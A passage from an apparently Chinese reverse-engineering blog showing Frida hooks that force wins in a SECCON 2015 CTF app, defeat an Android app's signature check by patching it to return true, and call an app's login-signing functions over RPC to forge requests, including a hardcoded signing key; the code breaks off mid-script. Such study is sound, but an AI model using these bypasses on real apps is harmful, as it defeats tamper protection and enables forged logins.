= <span class="keyword">new</span> Runnable() &#123; <span class="comment">// from class: com.example.seccon2015.rock_paper_scissors.MainActivity.1</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// java.lang.Runnable</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;   <span class="comment">//void 是java中的关键字,定义方法用它修饰表示什么也不返回.</span></span><br><span class="line">            TextView tv3 = (TextView) MainActivity.<span class="keyword">this</span>.findViewById(R.id.textView3);</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.n - MainActivity.<span class="keyword">this</span>.m == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">                tv3.setText(<span class="string">&quot;WIN! +&quot;</span> + String.valueOf(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m - MainActivity.<span class="keyword">this</span>.n == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                tv3.setText(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m == MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                tv3.setText(<span class="string">&quot;DRAW +&quot;</span> + String.valueOf(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m &lt; MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                tv3.setText(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">                tv3.setText(<span class="string">&quot;WIN! +&quot;</span> + String.valueOf(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">                tv3.setText(<span class="string">&quot;SECCON&#123;&quot;</span> + String.valueOf((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.calc()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hook 匿名类方法:</p><p> 类名去apktools -d 包名    然后到smali文件里搜索方法,存在这个方法的文件名,就是这个类名.</p><p>文件路径:com/example/seccon2015/rock_paper_scissors/MainActivity$1</p><p>类名:com.example.seccon2015.rock_paper_scissors.MainActivity$1</p><p>如代码例1-1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java.use(&#x27;类$类&#x27;)</span><br></pre></td></tr></table></figure><p><strong>从匿名类/内部类访问外部类的属性</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.this$0.value.外部类的属性名.value</span><br></pre></td></tr></table></figure><p>例1-1:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="comment">//固定的js函数写法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> act = Java.use(<span class="string">&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity$1&#x27;</span>)</span><br><span class="line"><span class="comment">//hook匿名类</span></span><br><span class="line">act.run.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.this$0.value.m.value = <span class="number">1</span><span class="comment">//访问外部类,或者匿名类.</span></span><br><span class="line">    <span class="built_in">this</span>.this$0.value.n.value = <span class="number">2</span></span><br><span class="line">    <span class="built_in">this</span>.run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frida 过APP签名校验</title>
      <link href="/posts/22137/"/>
      <url>/posts/22137/</url>
      
        <content type="html"><![CDATA[<p>判断APP是否存在签名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -printcert -jarfile app-debug.apk</span><br></pre></td></tr></table></figure><p>如果存在签名，就不能通过修改代码，重新编译对它进行篡改了，这时候我们只能通过Frida去hook分析判断,存在签名校验的相关函数,改写它,使它return true.从而过掉签名校验,任意的去修改代码从新编译了.</p><p><strong>反编译找到签名校验的关键点</strong></p><p><strong>context</strong>类:可以理解为“上下文”或者“场景”</p><p><strong>packageManager</strong>类:获取安卓信息和APP的信息</p><p><strong>signature</strong>类:提供数字签名算法功能,生成和验证数字签名</p><p>签名关键字:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.getPackageManager().getPackageInfo(context.getPackageName(), <span class="number">64</span>).signatures[<span class="number">0</span>].hashCode()</span><br></pre></td></tr></table></figure><p><strong>如果搜索不到相关的函数存在以下可能:</strong></p><p>1.通过代码混淆</p><p>2.写到了so文件</p><p>3.或者其他的技术</p><p>Signature公共方法</p><p> <a href="https://developer.android.google.cn/reference/android/content/pm/Signature">https://developer.android.google.cn/reference/android/content/pm/Signature</a></p><p><strong>代码混淆的情况:</strong></p><p>直接hook 系统类Signature的公共方法,因为不能确定目标APP使用是那种方法所以我们直接hook来一个一个判断</p><table><thead><tr><th><a href="https://developer.android.google.cn/reference/java/lang/Object">java.lang.Object</a></th><th></th></tr></thead><tbody><tr><td>↳类名</td><td>android.content.pm.Signature</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> Signature = Java.use(<span class="string">&#x27;android.content.pm.Signature&#x27;</span>)</span><br><span class="line">    Signature.toByteArray.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;toByteArray&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.toByteArray()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> Signature = Java.use(<span class="string">&#x27;android.content.pm.Signature&#x27;</span>)</span><br><span class="line">    Signature.hashCode.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;hashCode&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.hashCode()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">var</span> Signature = Java.use(<span class="string">&#x27;android.content.pm.Signature&#x27;</span>)</span><br><span class="line">     Signature.toCharsString.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">&#x27;toCharsString&#x27;</span>)</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">this</span>.toCharsString()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>打印调用堆栈找到具体代码位置</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> Signature = Java.use(<span class="string">&#x27;android.content.pm.Signature&#x27;</span>)</span><br><span class="line">    Signature.toByteArray.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;toByteArray&#x27;</span>)</span><br><span class="line">        printstack()     <span class="comment">//执行打印调用堆栈的函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.toByteArray()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印调用堆栈</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">printstack</span>(<span class="params"></span>) </span>&#123;    <span class="built_in">console</span>.log(Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>打印如下:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] Running</span><br><span class="line">toByteArray</span><br><span class="line">java.lang.Exception</span><br><span class="line">at android.content.pm.Signature.toByteArray(Native Method)</span><br><span class="line">at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">at com.chaozhuo.texteditor.widget.a.a(ARHelper.java:203)</span><br><span class="line">at com.chaozhuo.texteditor.widget.a.a(ARHelper.java:159)</span><br><span class="line">at com.chaozhuo.texteditor.widget.b.doInBackground(ARHelper.java:68)</span><br><span class="line">at android.os.AsyncTask$2.call(AsyncTask.java:333)</span><br><span class="line">at java.util.concurrent.FutureTask.run(FutureTask.java:266)</span><br><span class="line">at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:245)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)</span><br><span class="line">at java.lang.Thread.run(Thread.java:764)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析可得知具体代码在:</p><p><code>at com.chaozhuo.texteditor.widget.a.a</code></p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220316170431165.png" alt="image-20220316170431165"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] a2 = a((<span class="keyword">byte</span>[]) a(((Object[]) b(a(a(context, a(<span class="string">&quot;Z2V0UGFja2FnZU1hbmFnZXI=&quot;</span>)), a(<span class="string">&quot;Z2V0UGFja2FnZUluZm8=&quot;</span>), (String) a(context, a(<span class="string">&quot;Z2V0UGFja2FnZU5hbWU=&quot;</span>)), String.class, <span class="number">64</span>, Integer.TYPE), a(<span class="string">&quot;c2lnbmF0dXJlcw==&quot;</span>)))[<span class="number">0</span>], a(<span class="string">&quot;dG9CeXRlQXJyYXk=&quot;</span>)));</span><br></pre></td></tr></table></figure><p>可知代码经过了base64进行了混淆,还原后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] a2 = a((<span class="keyword">byte</span>[]) a(((Object[]) b(a(a(context, a(<span class="string">&quot;getPackageManager&quot;</span>)), a(<span class="string">&quot;getPackageInfo&quot;</span>), (String) a(context, a(<span class="string">&quot;getPackageName&quot;</span>)), String.class, <span class="number">64</span>, Integer.TYPE), a(<span class="string">&quot;signatures&quot;</span>)))[<span class="number">0</span>], a(<span class="string">&quot;toByteArray&quot;</span>)));</span><br></pre></td></tr></table></figure><p>很明显它是一个<strong>反射调用</strong>实现的,屏蔽实现细节隐藏了代码特征检测,这是我们无法通过系统签名校验的关键字搜索到相关代码的原因.</p><p>反射调用:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj.getClass().getMethod(<span class="string">&#x27;方法名字符串&#x27;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]).invoke(obj, <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">obj.getClass().getMethod(str, <span class="keyword">new</span> Class[<span class="number">0</span>]).invoke(obj, <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context.getClass().getMethod(<span class="string">&#x27;getPackageManager&#x27;</span>, <span class="keyword">new</span></span><br><span class="line">Class[<span class="number">0</span>]).invoke(context, <span class="keyword">new</span> Context[<span class="number">0</span>]);</span><br><span class="line">context.getPackageManager()</span><br></pre></td></tr></table></figure><p>hook a类验证</p><p>由于存在类方法重载需要指定具体参数（overload）即一个类下面存在多个a方法,这时候我们需要指定具体的参数.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Signature = Java.use(<span class="string">&#x27;com.chaozhuo.texteditor.widget.a&#x27;</span>)</span><br><span class="line">    Signature.a.overload(<span class="string">&#x27;android.content.Context&#x27;</span>).implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//overload(&#x27;android.content.Context&#x27;) 类的方法重载</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>   <span class="comment">//由于我们hook的这个方法没有往下走的逻辑,所以我们不需要写this.a(),直接return true</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>也可以直接hook a方法,从报错中选择要hook的方法如:</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220316173549684.png" alt="image-20220316173549684"></p><p>这里就完成了frida hook 过签名校验的过程.如果高频使用app,不想每次都Hook过签名校验,我们可以从新修改smail代码编译APP．</p><p><strong>修改smali源码过签名校验</strong></p><p>找到smali代码,/com/chaozhuo/texteditor/widget/a/a</p><p>搜索对应的位置,删除签名校验代码</p><p>新增 return true代码</p><p>smali代码: 可以用 java2smali转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.registers 2    </span><br><span class="line">    const/4 v1,0x1</span><br><span class="line">    return v1</span><br></pre></td></tr></table></figure><p>从新编译打包,安装手机后即可过掉校验.</p><p><strong>步骤</strong></p><p>先jadx反编译分析代码-搜索分析找到签名校验的关键点.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida rpc 远程主动调用APP加密函数</title>
      <link href="/posts/58074/"/>
      <url>/posts/58074/</url>
      
        <content type="html"><![CDATA[<p><strong>抓包分析app:</strong></p><p>登录POST请求:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /loginUser HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 322</span><br><span class="line">Host: api.passport.test.com</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: okhttp/3.11.0</span><br><span class="line"></span><br><span class="line">apiaccount=vrpuc-aaf91f835147ce2d01216bd3bd5c3516&amp;phone=18812345600&amp;sign=A31C4B536BA9BE0916548DD34BEB0985&amp;enc=Uz8aJcfYfJbdFo797QKb4SN3LQGA%2FFNY6qIBl046sSGco7r0PgNV67K6jIzgI7E9Y9Ag4%2FpctSEJrDey6qU33na%2Beci9FvB%2FgczumGGbxKXjxkO3qqfoZkRKsuy%2Bbf%2FBS7ZvgYj%2BhFXZixchs9QTgtf8uqFC4C8BjnBvqfVcCCk%3D&amp;timestamp=1647961433279</span><br></pre></td></tr></table></figure><p>经过分析 sign,enc加密,导致无法篡改请求包,其中密码也加密了.</p><p>逆向APP:</p><p>搜索请求参数名定位相关代码,在一通hook分析验证,确定了两个代码位置函数加密点.</p><p>enc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> O <span class="title">d</span><span class="params">(String str, String str2)</span> </span>&#123;</span><br><span class="line">       HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">       hashMap.put(<span class="string">&quot;phone&quot;</span>, str);</span><br><span class="line">       hashMap.put(<span class="string">&quot;enc&quot;</span>, e(str2)); <span class="comment">//根据hook分析代码得知,enc用e方法进行了加密</span></span><br><span class="line">       <span class="keyword">return</span> b.c(f.h(), a(hashMap));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>enc生成</strong></p><p>e方法:,password传入点.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">e</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">       String a2 = a(<span class="number">10</span>);</span><br><span class="line">       <span class="keyword">return</span> d(<span class="string">&quot;password=&quot;</span> + str + <span class="string">&quot;&amp;salt=&quot;</span> + a2); <span class="comment">//可见密码在str进行了拼接,a2为生成10为随机int整数.跟踪d方法发现有经过了各种骚操作,RSA加密等</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>sign分析:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title">a</span><span class="params">(Map&lt;String, String&gt; map)</span> </span>&#123;</span><br><span class="line">       HashMap hashMap = <span class="keyword">new</span> HashMap();<span class="comment">//大致看一下符合我们抓包的请求参数,hook验证</span></span><br><span class="line">       hashMap.put(<span class="string">&quot;apiaccount&quot;</span>, <span class="string">&quot;vrpuc-aaf91f835147ce2d01216bd3bd5c3516&quot;</span>);</span><br><span class="line">       hashMap.put(<span class="string">&quot;timestamp&quot;</span>, String.valueOf(System.currentTimeMillis()));</span><br><span class="line">       TreeMap treeMap = <span class="keyword">new</span> TreeMap();</span><br><span class="line">       treeMap.putAll(hashMap);</span><br><span class="line">       <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">           treeMap.putAll(map);</span><br><span class="line">       &#125;</span><br><span class="line">       hashMap.put(<span class="string">&quot;sign&quot;</span>, a((SortedMap&lt;String, String&gt;) treeMap));<span class="comment">//跟踪a方法</span></span><br><span class="line">       <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">           hashMap.putAll(map);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> hashMap;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>a方法传入了一个sortedMap参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(SortedMap&lt;String, String&gt; sortedMap)</span> </span>&#123;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : sortedMap.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!TextUtils.isEmpty(entry.getValue())) &#123;</span><br><span class="line">                stringBuffer.append(entry.getKey() + <span class="string">&quot;=&quot;</span> + entry.getValue() + <span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stringBuffer.append(<span class="string">&quot;key=a0f723c011346j39w049d7bf0356b34b&quot;</span>);<span class="comment">//添加Key到列表</span></span><br><span class="line">        <span class="keyword">return</span> D.d(stringBuffer.toString()).toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hook打印a传的sortedMap值,先用.$className方法判断是什么类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">   <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">       <span class="keyword">var</span> up = Java.use(<span class="string">&#x27;com.picovr.asstantphone.update.UpdateDialog&#x27;</span>)</span><br><span class="line">       up.a.overload(<span class="string">&#x27;com.picovr.asstantphone.update.UpdateDialog$a&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">q</span>)</span>&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&#x27;111111&#x27;</span>)</span><br><span class="line">       &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;coming&#x27;</span>) </span><br><span class="line">        <span class="keyword">var</span> dd = Java.use(<span class="string">&#x27;com.picovr.assistantphone.c.a.e&#x27;</span>) </span><br><span class="line">        dd.a.overload(<span class="string">&#x27;java.util.Map&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> p = Java.use(<span class="string">&#x27;java.util.HashMap&#x27;</span>).$new(v)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;map:&#x27;</span>+p)<span class="comment">//p.$className判断类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.a(v)</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">#登录触发</span><br><span class="line"><span class="attr">map</span>:&#123;phone=<span class="number">18812345600</span>, enc=MVPmyQlPSf2n1T+JLgVqGG7KeWM19riPffsgeDKe66Eq4wpe0EMEpicfbYpvmDe38PNOnPkRsGrNi4CkdBQIytn1h6wNR9GVLjljndIkRM441q9RbrXUPA/h3X5VK3CEt5K71E6iZofyDOb/6HaqhG404jHrLCG/jwHOMCrfU1Q=&#125;<span class="comment">//+key=a0f723c011346j39w049d7bf0356b34b</span></span><br></pre></td></tr></table></figure><p><strong>sign生成</strong></p><p>跟踪d方法:</p><p>根据上面的分析我们就确定了d方法为生成sign的加密函数</p><p>我们就利用d方法进行远程调用,构造出map列表传入到d方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">d</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (str == <span class="keyword">null</span> || str.length() == <span class="number">0</span>) ? <span class="string">&quot;&quot;</span> : d(str.getBytes());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>经过分析,我们对<strong>enc</strong>的操作较为简单,只需要把密码传进入接收return值即可拼接出enc</p><p><strong>sign</strong>的操作需要把上一步return的enc值放到sign里面,再有d处理即可.</p><p>找到了我们需要的enc,和sign的两处加密代码,我们开始写frida-rpc和拼接请求参数</p><p><strong>RPC ｄｏｍｅ：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">test=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">rpc.exports = &#123;</span></span><br><span class="line"><span class="string"> testfunc: function(str)&#123;//PS: 函数名不要大写</span></span><br><span class="line"><span class="string"> var enc = &#x27;</span><span class="string">&#x27; </span></span><br><span class="line"><span class="string"> Java.perform(function () &#123;</span></span><br><span class="line"><span class="string"> var a = Java.use(&quot;XXXXXXXXXXX&quot;);</span></span><br><span class="line"><span class="string"> enc = a.a(str)</span></span><br><span class="line"><span class="string"> &#125;);</span></span><br><span class="line"><span class="string"> return enc</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>hook.py:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida,sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span 